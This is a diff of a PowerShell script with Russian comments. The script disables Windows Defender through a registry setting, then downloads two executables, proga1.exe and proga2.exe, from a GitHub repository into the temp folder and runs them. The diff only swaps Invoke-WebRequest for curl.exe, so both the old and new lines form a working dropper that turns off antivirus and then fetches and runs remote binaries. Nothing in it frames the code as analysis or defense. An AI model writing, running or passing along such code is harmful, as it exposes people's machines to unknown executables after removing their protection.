@@ -33,46 +33,32 @@ Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWo
 
 Write-Host "Windows Defender DISABLED" -ForegroundColor Green
 
-# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ
+# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ ЧЕРЕЗ CURL
 Write-Host ""
 Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow
 
 $temp = $env:TEMP
 
-# Настройка для скачивания
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
 # Первый файл
 Write-Host "[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
-try {
-    Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe" -OutFile "$temp\proga1.exe" -UseBasicParsing
-    if (Test-Path "$temp\proga1.exe") {
-        Write-Host "SUCCESS: proga1.exe downloaded" -ForegroundColor Green
-        Write-Host "Running proga1.exe..." -ForegroundColor Green
-        Start-Process -FilePath "$temp\proga1.exe"
-    } else {
-        Write-Host "FAILED: proga1.exe not downloaded" -ForegroundColor Red
-    }
-} catch {
-    Write-Host "ERROR: $_" -ForegroundColor Red
+curl.exe -L -o "$temp\proga1.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
+if (Test-Path "$temp\proga1.exe") {
+    Write-Host "SUCCESS: proga1.exe downloaded" -ForegroundColor Green
+    Write-Host "Running proga1.exe..." -ForegroundColor Green
+    Start-Process -FilePath "$temp\proga1.exe"
+} else {
+    Write-Host "FAILED: proga1.exe not downloaded" -ForegroundColor Red
 }
-
-# Небольшая пауза между запусками
-Start-Sleep -Seconds 1
 
 # Второй файл
 Write-Host "[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
-try {
-    Invoke-WebRequest -Uri "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe" -OutFile "$temp\proga2.exe" -UseBasicParsing
-    if (Test-Path "$temp\proga2.exe") {
-        Write-Host "SUCCESS: proga2.exe downloaded" -ForegroundColor Green
-        Write-Host "Running proga2.exe..." -ForegroundColor Green
-        Start-Process -FilePath "$temp\proga2.exe"
-    } else {
-        Write-Host "FAILED: proga2.exe not downloaded" -ForegroundColor Red
-    }
-} catch {
-    Write-Host "ERROR: $_" -ForegroundColor Red
+curl.exe -L -o "$temp\proga2.exe" "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
+if (Test-Path "$temp\proga2.exe") {
+    Write-Host "SUCCESS: proga2.exe downloaded" -ForegroundColor Green
+    Write-Host "Running proga2.exe..." -ForegroundColor Green
+    Start-Process -FilePath "$temp\proga2.exe"
+} else {
+    Write-Host "FAILED: proga2.exe not downloaded" -ForegroundColor Red
 }
 
 Write-Host ""
